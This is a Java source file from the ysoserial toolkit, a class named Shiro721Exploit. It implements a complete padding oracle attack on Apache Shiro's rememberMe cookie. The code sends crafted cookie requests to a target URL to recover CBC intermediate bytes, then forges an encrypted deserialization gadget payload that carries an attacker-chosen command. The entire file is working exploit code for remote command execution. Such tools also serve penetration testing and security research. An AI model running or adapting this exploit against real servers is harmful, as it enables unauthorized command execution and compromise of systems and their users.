package ysoserial.exploit;

import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.log4j.Logger;
import ysoserial.Serializer;
import ysoserial.exploit.utils.ArrayUtil;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

public class Shiro721Exploit {
    private static Logger logger = Logger.getLogger(Shiro721Exploit.class.getClass());
    private byte[] plainText;
    private int blockSize;
    private int encryptBlockCount;
    private String url;
    private String loginRememberMe;
    private int requestCount;

    public Shiro721Exploit(byte[] plainText, int blockSize, String url, String loginRememberMe) throws IOException {
        this.blockSize = blockSize;
        this.plainText = this.paddingData(plainText);
        this.url = url;
        this.loginRememberMe = loginRememberMe;
        this.requestCount = 0;
    }


    // payload填充
    private byte[] paddingData(byte[] data) throws IOException {
        int paddingLength = this.blockSize - (data.length % this.blockSize);

        //计算要填充哪一个字节
        byte paddingByte = (byte) paddingLength;
        byte[] paddingBytes = new byte[paddingLength];
        Arrays.fill(paddingBytes, paddingByte);

        return ArrayUtil.mergerArray(data, paddingBytes);
    }

    private byte[] getBlockEncrypt(byte[] PlainTextBlock, byte[] nextCipherTextBlock) throws Exception {
        byte[] tmpIV = new byte[this.blockSize];
        byte[] encrypt = new byte[this.blockSize];
        Arrays.fill(tmpIV, (byte) 0);

        // 爆破nextCipherTextBlock在AES解密后的middle值
        // rmpIV为当前爆破出的middle值
        for (int index = this.blockSize - 1; index >= 0; index--) {
//            if(index==this.blockSize-1){
//                index=identifyType(tmpIV,nextCipherTextBlock)+1;
//                continue;
//            }
            tmpIV[index] = this.findCharacterEncrypt(index, tmpIV, nextCipherTextBlock);
            logger.debug(String.format("Current string => %s, the %d block", ArrayUtil.bytesToHex(ArrayUtil.mergerArray(tmpIV, nextCipherTextBlock)), this.encryptBlockCount));
        }

        for (int index = 0; index < this.blockSize; index++) {
            encrypt[index] = (byte) (tmpIV[index] ^ PlainTextBlock[index]);
        }
        return encrypt;
    }

    private boolean checkPaddingAttackRequest(String rememberMe) throws IOException {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet(this.url);
        CloseableHttpResponse response = null;
        boolean success = true;

        httpGet.addHeader("User-Agent", "Mozilla/5.0");
        httpGet.addHeader("Referer", this.url);
        httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));

        try {
            response = httpClient.execute(httpGet);
            this.requestCount += 1;
            Header[] headers = response.getAllHeaders();
            if (response.getStatusLine().getStatusCode() == 200) {
                for (Header header : headers) {
                    if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
                        success = false;
                }
            }
        } catch (IOException e) {
            logger.error("Request error when checkPaddingAttackRequest", e);
        } finally {
            if (response != null) response.close();
            httpClient.close();
        }
        return success;
    }

    private boolean serverType(byte[] preBlock, byte[] nextCipherTextBlock) throws IOException {
        // 将当前IV和要翻转攻击的分组拼接到合法cookie尾部
        byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);
        byte[] tmpBlock2 = ArrayUtil.mergerArray(preBlock, nextCipherTextBlock);
        byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
        String remeberMe = Base64.getEncoder().encodeToString(tmpBlock3);
        return this.checkPaddingAttackRequest(remeberMe);
    }

    private int identifyType(byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
        byte[] preBLock = new byte[this.blockSize];
        Arrays.fill(preBLock, (byte) 0);

        // 爆破IV最后一位，找到合法填充序列
        byte IV;
        for (int c = 0; c < 256; c++) {
            preBLock[this.blockSize-1] = (byte) c;
            if (this.serverType(preBLock,nextCipherTextBlock)) {
                // 记录爆破成功的IV值
                IV = (byte) c;

                byte[] testIv = new byte[this.blockSize];
                Arrays.fill(testIv, (byte) 0);
                testIv[this.blockSize-1] = (byte)(3^IV);
                int count = 0;
                int i=0;
                while (count<2&&i<256){
                    testIv[this.blockSize-2] = (byte) i;
                    i++;
                    if (this.serverType(testIv,nextCipherTextBlock))
                        count++;
                }

                // 根据已经确定的填充序列，返回下一个要爆破的位
                if(count==1) {
                    tmpIV[this.blockSize-1]=(byte)(IV^1);
                    return this.blockSize - 2;
                }
                else if (count==2) {
                    tmpIV[this.blockSize-1]=(byte)(IV^2);
                    tmpIV[this.blockSize-2]=(byte)2;
                    return this.blockSize - 3;
                }else {
                    Arrays.fill(testIv, (byte) 0);
                    for (int j=3;j<=this.blockSize;j++){
                        // 确定是除0x01和0x02外的哪个填充序列
                        testIv[this.blockSize-1]=(byte)(j^1^IV);
                        if (this.serverType(testIv,nextCipherTextBlock)) {
                            // 计算已经确定的中间值
                            tmpIV[this.blockSize - 1] = (byte) (IV ^ j);
                            for (int k = j; k > 1; k--) {
                                tmpIV[this.blockSize - k] = (byte) j;
                            }
                            // 返回下一个要爆破的middle位
                            return this.blockSize - j - 1;
                        }
                    }
                }
            }
        }

        throw new Exception("Occurs errors when find encrypt character, could't find a suiteable Character!!!");
    }

    private byte findCharacterEncrypt(int index, byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
        if (nextCipherTextBlock.length != this.blockSize) {
            throw new Exception("CipherTextBlock size error!!!");
        }

        // 填充字符
        byte paddingByte = (byte) (this.blockSize - index);

        byte[] preBLock = new byte[this.blockSize];
        Arrays.fill(preBLock, (byte) 0);

        // preBLock为当前IV，它保证index+1及以后的位为paddingByte，我们需要爆破index位
        // IV为已经爆破出的middle值
        for (int ix = index; ix < this.blockSize; ix++) {
            preBLock[ix] = (byte) (paddingByte ^ tmpIV[ix]);
        }

        for (int c = 0; c < 256; c++) {
            //nextCipherTextBlock[index] < 256，那么在这个循环结果中构成的结果还是range(1,256)
            //所以下面两种写法都是正确的，当时看到原作者使用的是第一种方式有点迷，测试了下都可以
//            preBLock[index] = (byte) (paddingByte ^ nextCipherTextBlock[index] ^ c);
            preBLock[index] = (byte) c;

            // 将当前IV和要翻转攻击的分组拼接到合法cookie尾部
            byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);
            byte[] tmpBlock2 = ArrayUtil.mergerArray(preBLock, nextCipherTextBlock);
            byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
            String remeberMe = Base64.getEncoder().encodeToString(tmpBlock3);
            if (this.checkPaddingAttackRequest(remeberMe)) {
                return (byte) (preBLock[index] ^ paddingByte);
            }
            /*
            if (this.checkPaddingAttackRequest(remeberMe)) {
                return (byte) (preBLock[index] ^ paddingByte);
            }
            */
        }
        throw new Exception("Occurs errors when find encrypt character, could't find a suiteable Character!!!");
    }

    // 入参nextBLock为要翻转攻击的分组，未null时表示为payload的最后一个分组
    public String encrypt(byte[] nextBLock) throws Exception {
        logger.debug("Start encrypt data...");
        byte[][] plainTextBlocks = ArrayUtil.splitBytes(this.plainText, this.blockSize);

        if (nextBLock == null || nextBLock.length == 0 || nextBLock.length != this.blockSize) {
            logger.warn("You provide block's size is not equal blockSize,try to reset it...");
            nextBLock = new byte[this.blockSize];
        }
        byte randomByte = (byte) (new Random()).nextInt(127);
        Arrays.fill(nextBLock, randomByte);

        // 将payload翻转，由于CBC解密特性，CBC翻转攻击从payload的尾部开始
        byte[] result = nextBLock;
        byte[][] reverseplainTextBlocks = ArrayUtil.reverseTwoDimensionalBytesArray(plainTextBlocks);
        this.encryptBlockCount = reverseplainTextBlocks.length;
        logger.info(String.format("Total %d blocks to encrypt", this.encryptBlockCount));

        for (byte[] plainTextBlock : reverseplainTextBlocks) {
            // 每一块的CBC翻转攻击，nextBLock为当前翻转分组，plainTextBlock为要翻转为的结果，返回的IV作为下一块翻转分组
            nextBLock = this.getBlockEncrypt(plainTextBlock, nextBLock);
            result = ArrayUtil.mergerArray(nextBLock, result);

            this.encryptBlockCount -= 1;
            logger.info(String.format("Left %d blocks to encrypt", this.encryptBlockCount));
        }

        logger.info(String.format("Generate payload success, send request count => %s", this.requestCount));

        return Base64.getEncoder().encodeToString(result);
    }


    public static void main(String[] args) throws Exception {

        String targetUrl = args[0];
        String rememberMeCookie = args[1];
        int blockSize = Integer.parseInt(args[2]);
        String gadget = CommonsCollections1.class.getPackage().getName() +  "." +  args[3].trim();
        String command = args[4];


        final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(gadget);
        ObjectPayload payloadObj = payloadClass.newInstance();
        Object payload = payloadObj.getObject(command);
        byte[] ser = Serializer.serialize(payload);

        Shiro721Exploit poracle = new Shiro721Exploit(ser, blockSize, targetUrl, rememberMeCookie);

        logger.info(String.format("Result => %s", poracle.encrypt(null)));
    }
}

